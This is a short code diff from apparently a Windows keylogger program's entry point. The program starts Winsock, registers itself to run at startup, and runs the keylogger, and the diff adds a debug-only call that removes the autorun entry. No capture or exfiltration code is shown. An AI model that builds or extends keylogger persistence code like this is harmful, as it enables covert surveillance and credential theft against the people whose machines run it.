@@ -23,6 +23,9 @@ int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCm
     WSAStartup(MAKEWORD(2, 0), &WSAData);
 
     keylogger.RegisterAutorun();
+#ifdef _DEBUG
+    keylogger.RemoveAutorun();
+#endif
     keylogger.Run();
 
     WSACleanup();
